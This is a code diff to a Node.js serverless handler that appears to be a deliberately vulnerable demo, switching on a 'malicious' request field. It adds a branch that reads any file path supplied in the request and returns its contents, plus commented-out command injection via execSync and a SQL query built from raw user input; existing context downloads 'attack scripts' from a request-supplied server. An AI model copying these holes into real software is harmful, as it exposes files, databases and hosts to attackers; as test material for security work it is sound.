@@ -17,7 +17,8 @@ const constants = {
 
 module.exports = async (event, context, callback) => {
 	console.log(event);
-
+	console.log("event:body");
+	console.log(event.body);
 	if (event.body.malicious == 'one') {
 		console.log('Step 1: Downloading attack scripts');
 		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'sqldump.sh');
@@ -118,6 +119,107 @@ module.exports = async (event, context, callback) => {
 			};
 			callback(null, response);
 		}
+	}else if (event.body.malicious == 'readFiles') {
+		/*var fileName = event.body.fileName;
+		var response = { 'data': 'done'  , 'type' : 'read' }
+		child_process.execSync(`touch ${fileName}`);
+		callback(null, response);*/
+        const filesToRead = [event.body.fileName]; 
+        Promise.all(filesToRead.map(file => {  
+            return new Promise((resolve, reject) => {  
+                fs.readFile(file, 'utf8', (err, data) => {  
+                    if (err) {  
+                        reject(`Error reading file ${file}: ${err}`);  
+                    } else {  
+                        resolve({file, content: data});  
+                    }  
+                });  
+            });  
+        }))  
+        .then(results => {  
+            callback(null, {  
+                approved: 'true',  
+                files: results  
+            });  
+        })  
+        .catch(err => {  
+            callback(null, {  
+                approved: 'false',  
+                failureReason: err 
+            });  
+        });  
+    } else if (event.body.malicious == 'sqlInjection') {  
+		const fs = require('fs');  
+		const mysql = require('mysql');  
+	
+		const sqlQuery = event.body.sql;   
+		const fileToRead = event.body.fileName;   
+	
+		// 直接连接到 MySQL，无需启动服务  
+		const connection = mysql.createConnection({  
+			host: constants.HOST,  
+			user: constants.USER,  
+			password: constants.PASS,  
+			database: constants.DBNAME  
+		});  
+		connection.connect((err) => {  
+			if (err) {  
+				console.error('Error connecting to MySQL:', err);  
+				return callback(null, { approved: 'false', failureReason: 'Database connection failed: ' + err.message });  
+			}  
+			// Log successful connection  
+			console.log('Connected to MySQL');  
+			connection.query('SELECT 1', (error, results) => {  
+				if (error) {  
+					console.error('SQL Error:', error);  
+					callback(null, {  
+						approved: 'false',  
+						failureReason: error.message  
+					});  
+				} else {  
+					console.log('Query executed successfully:', results);  
+					// Execute your SQL query here  
+				}  
+			});  
+		});
+		/*connection.connect((err) => {  
+			if (err) {  
+				console.error('Error connecting to MySQL:', err);  
+				return callback(null, {  
+					approved: 'false',  
+					failureReason: 'Database connection failed: ' + err.message  
+				});  
+			}  
+	
+			const query = `SELECT * FROM users WHERE user_id = '${sqlQuery}';`;   
+			connection.query(query, (error, results) => {  
+				if (error) {  
+					console.error('SQL Error:', error);  
+					callback(null, {  
+						approved: 'false',  
+						failureReason: error.message  
+					});  
+				} else {  
+					try {  
+						const data = fs.readFileSync(fileToRead, 'utf8');  
+						console.log('Read file content:', data);  
+	
+						callback(null, {  
+							approved: 'true',  
+							results: results,  
+							fileContent: data  
+						});  
+					} catch (err) {  
+						console.error('Error reading file:', err);  
+						callback(null, {  
+							approved: 'false',  
+							failureReason: 'File read error: ' + err.message  
+						});  
+					}  
+				}  
+			});  
+			connection.end();  
+		});  */
 	} else {
 		var result = {};
 		if (event.body.creditCard) {
